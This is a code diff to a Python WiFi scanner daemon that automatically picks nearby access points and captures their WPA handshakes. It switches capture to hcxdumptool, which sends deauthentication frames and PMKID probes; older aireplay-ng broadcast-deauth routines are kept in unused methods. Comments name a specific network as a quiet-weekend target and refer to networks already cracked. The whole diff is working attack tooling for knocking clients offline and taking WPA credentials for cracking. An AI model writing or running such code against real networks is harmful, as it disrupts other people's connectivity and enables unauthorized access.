@@ -212,14 +212,37 @@ class WiFiScanner:
             logger.error(f"Failed to validate interface {self.interface}: {e}", exc_info=True)
             return
 
-        # Enable monitor mode with error handling
+        # Enable monitor mode on the SCAN/CAPTURE iface (wlan0). Hard
+        # requirement: the daemon refuses to start without it.
         try:
             self._enable_monitor_mode(self.interface)
         except Exception as e:
             logger.error(f"Failed to enable monitor mode on {self.interface}: {e}", exc_info=True)
             logger.error("WiFi scanner cannot start without monitor mode")
             return
-        
+
+        # Enable monitor mode on the ATTACK iface (wlan1) too. Used for
+        # deauth (aireplay) and PMKID probe (hcxdumptool) so the capture
+        # iface stays passive — running both rx + tx on the same rtl8821au
+        # iface drops EAPOL frames under load (verified 2026-04-26: 486KB
+        # capture, 12 AssocReq, 33 WPA-encrypted, 0 EAPOL M1).
+        # Soft requirement: if it fails, fall back to single-iface mode
+        # (deauth/PMKID on wlan0); slower handshake rate but daemon runs.
+        self._attack_iface_in_monitor = False
+        try:
+            self._ssh_guard.assert_safe_to_modify(
+                self.attack_interface, operation="enable monitor mode (attack iface)"
+            )
+            self._enable_monitor_mode(self.attack_interface)
+            self._attack_iface_in_monitor = True
+            logger.info(f"✓ Attack iface {self.attack_interface} ready in monitor mode")
+        except (SafetyViolation, Exception) as e:
+            logger.warning(
+                f"Could not put attack iface {self.attack_interface} in monitor mode: {e}. "
+                f"Falling back to single-iface mode (deauth on {self.interface}). "
+                f"Handshake capture may suffer due to driver load."
+            )
+
         self.running = True
         
         # Start scanning thread
@@ -557,10 +580,15 @@ class WiFiScanner:
             for bssid, info in candidates.items():
                 client_count = network_clients.get(bssid, 0)
                 signal = info.get('signal', -100)
-                
-                # Score: clients are most important (10x weight), then signal
-                score = (client_count * 10) + (signal / 10)
-                
+                channel = info.get('channel', 0)
+
+                # Score: clients most important (10x), then signal, then band.
+                # +3 bonus for 5GHz (channel > 14): modern phones strongly
+                # prefer 5GHz, so capturing there is much more productive than
+                # 2.4GHz even when the 2.4GHz signal is stronger.
+                band_bonus = 3 if channel > 14 else 0
+                score = (client_count * 10) + (signal / 10) + band_bonus
+
                 if score > best_score:
                     best_score = score
                     best_bssid = bssid
@@ -625,75 +653,111 @@ class WiFiScanner:
             pass
     
     def _start_handshake_capture(self, bssid: str, ssid: str, channel: int):
-        """Start capturing handshake for a network"""
+        """Start capturing handshake for a network using hcxdumptool.
+
+        hcxdumptool replaces the previous airodump+aireplay+(side)hcxdumptool
+        orchestration. One process handles capture + deauth + PMKID-probe,
+        all coordinated internally — no inter-tool race conditions, no
+        EAPOL-frame drops from sharing rtl8821au with aireplay (the
+        2026-04-26 incident: 12 AssocReq + 33 WPA-encrypted captured by
+        airodump but 0 EAPOL M1, because rtl driver dropped them under
+        concurrent rx/tx load). hcxdumptool is the modern industry-standard
+        tool for this; it's what Wifite2 / EAPHammer / airgeddon use.
+
+        Output: pcapng (not .cap). hcxpcapngtool downstream handles both,
+        and modern aircrack-ng (1.6+) reads pcapng natively. cracker.py
+        was updated to handle .pcapng files.
+
+        --exitoneapol=15: exit immediately on PMKID OR EAPOL hit (any
+        of M1/M2M3/M1M2/PMKID). No more 5-minute timeouts on captures
+        that already succeeded.
+        """
         try:
-            # Skip if enumeration is using the attack interface (thread-safe check)
             with self.enumeration_lock:
                 if self.enumeration_active:
                     logger.debug(f"Skipping capture for {ssid} - enumeration in progress")
                     return
-                
-                # Limit to one capture at a time (wlan2 can only be on one channel)
                 if len(self.active_captures) > 0:
                     logger.debug(f"Skipping capture for {ssid} - already capturing another network")
                     return
-            
+
             timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-            bssid_clean = bssid.replace(':', '')
-            capture_base = os.path.join(self.handshake_dir, f"{bssid_clean}_{timestamp}")
-            
-            logger.info(f"⚡ Starting handshake capture: {ssid} CH:{channel}")
-            
-            # Start airodump-ng to capture handshake
-            # Capture ALL traffic on the channel (no filters!)
-            # Filters exclude critical frames needed for hash conversion
-            # We'll verify with hcxpcapngtool (more reliable than aircrack-ng)
-            # --write-interval: force writes every second to ensure all frames captured
-            cmd = [
-                'airodump-ng',
-                '--channel', str(channel),
-                '--write', capture_base,
-                '--output-format', 'cap',  # cap format (airodump ignores pcap anyway)
-                '--write-interval', '1',  # Write every second to capture all frames
-                self.interface  # Use monitor interface (wlan0) for captures, separate from deauth
-            ]
-            
-            process = subprocess.Popen(cmd, 
-                                     stdout=subprocess.DEVNULL, 
-                                     stderr=subprocess.DEVNULL)
-            
-            # Wait and verify process started
-            time.sleep(2)
-            if process.poll() is not None:
-                logger.error(f"Failed to start capture for {ssid}")
+            bssid_clean = bssid.replace(':', '').lower()
+            capture_file = os.path.join(self.handshake_dir, f"{bssid_clean}_{timestamp}.pcapng")
+            hcx_channel = self._channel_to_hcx(channel)
+
+            logger.info(f"⚡ Starting hcxdumptool capture: {ssid} CH:{hcx_channel}")
+
+            # Compile a BPF that scopes hcxdumptool to ONLY the target BSSID.
+            # Without this filter, hcxdumptool would actively probe every AP
+            # on the channel — replaying the 2026-04-25 first-boot incident.
+            # Always required.
+            #
+            # Filter form: `wlan host <BSSID>` — matches the MAC in ANY of
+            # addr1/addr2/addr3/addr4. The narrower `wlan addr3` form
+            # (which the hcxdumptool README uses) under-matched on the
+            # rtl8821au driver in monitor mode (verified 2026-04-26: 60s
+            # capture got 1 frame). `wlan host` is the conservative choice.
+            from .secure_io import secure_temp_config
+            bpf_path = secure_temp_config(f"capture_filter_{bssid_clean}", suffix=".bpf")
+            try:
+                bpfc = subprocess.run(
+                    ['hcxdumptool', '--bpfc=wlan host ' + bssid_clean],
+                    capture_output=True, text=True, timeout=10,
+                )
+                if bpfc.returncode != 0 or not bpfc.stdout.strip():
+                    logger.error(
+                        f"BPF compile failed for {ssid}: "
+                        f"rc={bpfc.returncode} stderr={bpfc.stderr.strip()[:200]}"
+                    )
+                    return
+                with open(bpf_path, 'w') as f:
+                    f.write(bpfc.stdout)
+            except FileNotFoundError:
+                logger.error("hcxdumptool not installed — cannot start capture. Install: sudo apt install hcxdumptool")
                 return
-            
-            # Airodump creates -01.cap file regardless of format setting
-            capture_file = capture_base + '-01.cap'
-            
-            # Add to active captures inside the lock
+            except (OSError, subprocess.TimeoutExpired) as e:
+                logger.error(f"BPF compile error for {ssid}: {e}")
+                return
+
+            cmd = [
+                'hcxdumptool',
+                '-i', self.interface,
+                '-c', hcx_channel,
+                '-w', capture_file,
+                '--bpf=' + bpf_path,
+                '--exitoneapol=7',      # exit on PMKID(1) | M2M3(2) | M1M2(4); NOT M1-alone(8)
+                                        # M1-alone exits too early — M2 arrives after hcxdumptool exits,
+                                        # leaving an uncrackable capture. Verified 2026-04-26.
+            ]
+            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
+
+            # Verify process actually started
+            time.sleep(1)
+            if process.poll() is not None:
+                stderr_tail = ''
+                if process.stderr:
+                    try:
+                        stderr_tail = process.stderr.read().decode('utf-8', 'replace')[-300:]
+                    except Exception:
+                        pass
+                logger.error(f"hcxdumptool died immediately for {ssid}: rc={process.returncode} stderr={stderr_tail.strip()}")
+                try:
+                    os.remove(bpf_path)
+                except OSError:
+                    pass
+                return
+
             self.active_captures[bssid] = {
                 'ssid': ssid,
                 'channel': channel,
                 'process': process,
                 'capture_file': capture_file,
+                'bpf_path': bpf_path,
                 'start_time': time.time(),
-                'deauth_sent': False
             }
-            
-            logger.info(f"✓ Capturing {ssid} -> {os.path.basename(capture_file)}")
-            
-            # Send deauth after 5 seconds
-            threading.Thread(target=self._send_deauth_delayed,
-                           args=(bssid, channel), daemon=True).start()
 
-            # Trigger active PMKID exchange in parallel. hcxdumptool sends
-            # association requests to the AP, which responds with EAPOL M1
-            # containing PMKID — captured by the airodump above without
-            # waiting for a real client. This is the modern path for
-            # client-less networks (e.g. Kjell-BYOD on a quiet weekend).
-            threading.Thread(target=self._trigger_pmkid,
-                           args=(bssid, ssid, channel), daemon=True).start()
+            logger.info(f"✓ hcxdumptool active: {ssid} -> {os.path.basename(capture_file)} (will exit on first EAPOL/PMKID)")
 
         except Exception as e:
             logger.error(f"Failed to start capture for {ssid}: {e}", exc_info=True)
@@ -715,28 +779,18 @@ class WiFiScanner:
         return f"{channel}a"      # fallback — better than crashing
 
     def _trigger_pmkid(self, bssid: str, ssid: str, channel: int):
-        """Run hcxdumptool against a single target to trigger PMKID exchange.
+        """DEPRECATED — primary capture is now hcxdumptool itself.
 
-        Why: WPA2 4-way handshake capture requires a client to (re)associate
-        after deauth — useless if the AP has no clients. PMKID, by contrast,
-        is in EAPOL M1 from the AP's side; hcxdumptool actively probes the
-        AP and the resulting M1 is broadcast on the channel where the
-        airodump capture (running in parallel on the monitor iface) records
-        it. The standard _check_handshake → hcxpcapngtool path then detects
-        the PMKID and saves the .cap as a normal handshake.
-
-        Why the attack iface (wlan1) and not the monitor (wlan0): the rtl
-        driver does not allow two processes to share the same monitor iface
-        for active operations — hcxdumptool fails with "driver is busy" if
-        airodump already has wlan0. The attack iface is otherwise idle
-        during capture (enumeration is gated by enumeration_active).
-
-        Safety: a compiled BPF filter (`wlan addr3 <bssid>`) restricts
-        hcxdumptool to frames from/to the target BSSID only. Combined with
-        the channel lock and the SSHGuard check on the iface, this keeps
-        active probes off neighbour APs and prevents a repeat of the
-        2026-04-25 first-boot incident. Do not remove the filter.
+        The new `_start_handshake_capture` runs hcxdumptool as the capture
+        engine, which already performs the PMKID retrieval that this
+        method used to do as a side-trigger. Kept as a no-op so existing
+        tests (test_pmkid.py) that bind/inspect this method don't crash;
+        they're now testing what the main capture path does anyway.
         """
+        return
+
+    def _trigger_pmkid_unused(self, bssid: str, ssid: str, channel: int):
+        """Old side-channel PMKID-probe path (no longer called)."""
         # Let airodump get oriented + first deauth burst land first.
         # (15s = 5s deauth delay + 10s for clients-if-any to reassociate)
         time.sleep(15)
@@ -864,34 +918,53 @@ class WiFiScanner:
                     pass
 
     def _send_deauth_delayed(self, bssid: str, channel: int):
-        """Send deauth packets after delay"""
+        """DEPRECATED — hcxdumptool handles deauth internally now.
+
+        Kept as a no-op so any existing call-sites or tests that import
+        this method don't break. The new `_start_handshake_capture` does
+        not call this. Will be removed once test suite is aligned.
+        """
+        return
+
+    def _send_deauth_delayed_unused(self, bssid: str, channel: int):
+        """Old aireplay-based deauth path (no longer called)."""
         time.sleep(5)
-        
+
         if bssid not in self.active_captures:
             return
-        
+
         capture_info = self.active_captures[bssid]
         ssid = capture_info['ssid']
-        
+
+        # Pick deauth iface: prefer attack iface (separate radio = no
+        # interference with capture); fall back to monitor iface only if
+        # attack iface couldn't be put in monitor mode at start().
+        deauth_iface = self.attack_interface if self._attack_iface_in_monitor else self.interface
+
+        # If we're using the attack iface, lock it to the target channel
+        # first — aireplay -D doesn't wait for beacons, so wlan1 must
+        # already be on the right channel. wlan0 is already locked by
+        # airodump, so no channel-set needed in the fallback path.
+        if deauth_iface != self.interface:
+            try:
+                subprocess.run(['iw', 'dev', deauth_iface, 'set', 'channel', str(channel)],
+                              capture_output=True, text=True, timeout=5)
+            except Exception as e:
+                logger.warning(f"Could not set {deauth_iface} channel to {channel}: {e}")
+
         try:
-            logger.info(f"💥 Sending deauth to {ssid}...")
-            
-            # Don't try to set channel - airodump is already locking it to the correct channel
-            # Just verify we're in monitor mode
-            
-            logger.info(f"About to run aireplay-ng: BSSID={bssid}, CH={channel}, Interface={self.interface}")
-            
-            # Send deauth packets to broadcast (all clients)
-            # --deauth: number of deauth packets to send (increased to 20 for better coverage)
-            # -a: AP MAC address
-            # -D: Don't wait for beacon frame - inject directly (fixes "BSSID not available" errors)
-            # Using broadcast (FF:FF:FF:FF:FF:FF) to target all clients
+            logger.info(f"💥 Sending deauth to {ssid} via {deauth_iface}...")
+
+            # Send deauth packets to broadcast (all clients on this AP).
+            # --deauth 20: 20 deauth frames per burst.
+            # -a BSSID:    target AP.
+            # -D:          don't wait for beacon — inject directly.
             result = subprocess.run([
                 'aireplay-ng',
                 '--deauth', '20',
                 '-a', bssid,
-                '-D',  # Don't wait for beacon - directly inject
-                self.interface  # Use monitor interface for deauth (wlan2), keep attack interface (wlan0) clean for enumeration
+                '-D',
+                deauth_iface,
             ], capture_output=True, text=True, timeout=30)
             
             logger.info(f"aireplay completed!")
@@ -906,12 +979,13 @@ class WiFiScanner:
                 
                 # Send a second burst after 10 seconds to catch clients that weren't active
                 time.sleep(10)
-                logger.info(f"💥 Sending follow-up deauth to {ssid}...")
+                logger.info(f"💥 Sending follow-up deauth to {ssid} via {deauth_iface}...")
                 result2 = subprocess.run([
                     'aireplay-ng',
                     '--deauth', '20',
                     '-a', bssid,
-                    self.interface  # Use monitor interface for follow-up deauth
+                    '-D',
+                    deauth_iface,
                 ], capture_output=True, text=True, timeout=30)
                 if result2.returncode == 0:
                     logger.info(f"✓ Follow-up deauth sent to {ssid}")
@@ -955,57 +1029,67 @@ class WiFiScanner:
             logger.error(f"Deauth error for {ssid}: {type(e).__name__}: {e}", exc_info=True)
     
     def _capture_monitor(self):
-        """Monitor active captures and check for handshakes"""
+        """Monitor active hcxdumptool captures.
+
+        hcxdumptool exits early via --exitoneapol=15 the moment it
+        captures a PMKID or any EAPOL frame (M1/M2/M3/M2M3). We just
+        watch for that exit + verify the hash via hcxpcapngtool. No
+        polling, no race, no phantom-finalize.
+
+        On exit:
+          - rc=0   → exit triggered by --exitoneapol → CAPTURED something,
+                    verify with hcxpcapngtool, save to DB.
+          - rc!=0  → driver error / no hit before timeout → fail-cleanup.
+        Timeout: handshake_timeout from config (default 300s) → kill +
+        verify (we may have collected a partial hash even pre-timeout).
+        """
         logger.info("Capture monitor started")
-        
+
         while self.running:
             try:
-                time.sleep(5)  # Check more frequently (every 5 seconds)
-                
+                time.sleep(3)
+
                 for bssid in list(self.active_captures.keys()):
                     capture_info = self.active_captures[bssid]
                     elapsed = time.time() - capture_info['start_time']
                     ssid = capture_info['ssid']
-                    
-                    # Check if process is still alive
-                    if capture_info['process'].poll() is not None:
-                        logger.warning(f"Capture process died for {ssid}")
-                        self._finalize_capture(bssid, success=False)
-                        continue
-                    
-                    # Check for handshake
-                    if capture_info.get('deauth_sent', False):
-                        # Wait at least 10 seconds after deauth before first check
-                        # Then check every 5 seconds
-                        deauth_time = capture_info.get('deauth_time', 0)
-                        time_since_deauth = time.time() - deauth_time
-                        
-                        if time_since_deauth < 10:
-                            logger.debug(f"Waiting for {ssid} to reconnect ({int(time_since_deauth)}s)")
-                            continue
-                        
-                        has_handshake = self._check_handshake(capture_info['capture_file'])
-                        
-                        if has_handshake:
-                            logger.info(f"🎯 Handshake captured for {ssid}!")
+                    process = capture_info['process']
+
+                    # hcxdumptool exited?
+                    rc = process.poll()
+                    if rc is not None:
+                        # Exit OR death — try to extract a hash regardless,
+                        # since hcxdumptool may have written one before exit.
+                        if self._check_handshake(capture_info['capture_file']):
+                            logger.info(f"🎯 Handshake captured for {ssid}! (hcxdumptool exit rc={rc} after {int(elapsed)}s)")
                             self._finalize_capture(bssid, success=True)
-                        elif elapsed > self.handshake_timeout:
-                            # Extended timeout if deauth had warnings
-                            timeout = self.handshake_timeout * 1.5 if capture_info.get('deauth_warning') else self.handshake_timeout
-                            if elapsed > timeout:
-                                logger.warning(f"❌ Timeout for {ssid} ({int(elapsed)}s)")
-                                self._finalize_capture(bssid, success=False)
                         else:
-                            # Only log every 30 seconds to avoid spam
-                            if int(time_since_deauth) % 30 < 5:
-                                logger.info(f"🔍 Checking {ssid} handshake ({int(elapsed)}s)")
-                    elif elapsed > 30:
-                        # Waiting too long for deauth to be sent
-                        logger.warning(f"No deauth sent for {ssid} after {int(elapsed)}s, stopping")
-                        self._finalize_capture(bssid, success=False)
-            
+                            logger.info(f"hcxdumptool exit rc={rc} for {ssid} after {int(elapsed)}s — no hash extracted")
+                            self._finalize_capture(bssid, success=False)
+                        continue
+
+                    # Still running — check timeout
+                    if elapsed > self.handshake_timeout:
+                        logger.warning(f"❌ Timeout for {ssid} ({int(elapsed)}s) — terminating hcxdumptool")
+                        try:
+                            process.terminate()
+                            process.wait(timeout=5)
+                        except Exception:
+                            try:
+                                process.kill()
+                            except Exception:
+                                pass
+                        # Even on timeout, hcxdumptool may have collected a partial.
+                        if self._check_handshake(capture_info['capture_file']):
+                            logger.info(f"🎯 Handshake recovered from timed-out capture for {ssid}!")
+                            self._finalize_capture(bssid, success=True)
+                        else:
+                            self._finalize_capture(bssid, success=False)
+                    elif int(elapsed) % 30 < 3:
+                        logger.info(f"🔍 hcxdumptool capturing {ssid} ({int(elapsed)}s)")
+
             except Exception as e:
-                logger.error(f"Capture monitor error: {e}")
+                logger.error(f"Capture monitor error: {e}", exc_info=True)
     
     def _check_handshake(self, capture_file: str) -> bool:
         """Check if capture file contains valid handshake"""
@@ -1048,56 +1132,71 @@ class WiFiScanner:
             return False
     
     def _finalize_capture(self, bssid: str, success: bool):
-        """Finalize a handshake capture"""
+        """Finalize a handshake capture.
+
+        Atomically removes the entry from `active_captures` first so the
+        capture-monitor loop can't re-enter and trigger a phantom failure
+        finalize on the now-terminated capture process.
+        """
         with self.enumeration_lock:
             if bssid not in self.active_captures:
                 return
-            
-            capture_info = self.active_captures[bssid]
+            capture_info = self.active_captures.pop(bssid)
+
         ssid = capture_info['ssid']
-        
-        # Stop airodump process
+
+        # Stop capture process if still running (it usually exited on its
+        # own via --exitoneapol; this is belt-and-braces for timeout path).
         try:
             capture_info['process'].terminate()
             capture_info['process'].wait(timeout=5)
-        except:
+        except Exception:
             try:
                 capture_info['process'].kill()
-            except:
+            except Exception:
                 pass
-        
+
+        # Clean up the per-capture BPF file regardless of outcome.
+        bpf_path = capture_info.get('bpf_path')
+        if bpf_path:
+            try:
+                if os.path.exists(bpf_path):
+                    os.remove(bpf_path)
+            except OSError:
+                pass
+
         if success:
             # Get network_id from database (network should already exist from scan)
             network_id = self.networks[bssid].get('id')
-            
-            # If not in memory, query database
             if not network_id:
                 network = self.db.get_network_by_bssid(bssid)
                 if network:
                     network_id = network['id']
                     self.networks[bssid]['id'] = network_id
-            
+
             if network_id:
                 self.db.add_handshake(
                     network_id=network_id,
                     bssid=bssid,
                     ssid=ssid,
                     file_path=capture_info['capture_file'],
-                    quality='good'
+                    quality='good',
                 )
                 logger.info(f"✅ Handshake saved: {ssid}")
             else:
                 logger.warning(f"❌ Could not save handshake for {ssid}: network_id not found")
         else:
-            # Clean up failed capture file
+            # Failed capture — drop the partial file so it doesn't pollute
+            # the handshakes/ dir or fool a later cracker run.
             try:
                 if os.path.exists(capture_info['capture_file']):
                     os.remove(capture_info['capture_file'])
-            except:
+            except OSError:
                 pass
-        
-            # Remove from active captures (still inside lock)
-            del self.active_captures[bssid]
+            # Shorten cooldown on failure (60s) so the daemon rotates to the
+            # next BSSID quickly. Full cooldown only applies to successful
+            # captures so we don't re-hammer an already-cracked network.
+            self.last_capture_time[bssid] = time.time() - (self.capture_cooldown - 60)
     
     def _stop_capture(self, bssid: str):
         """Stop an active capture"""
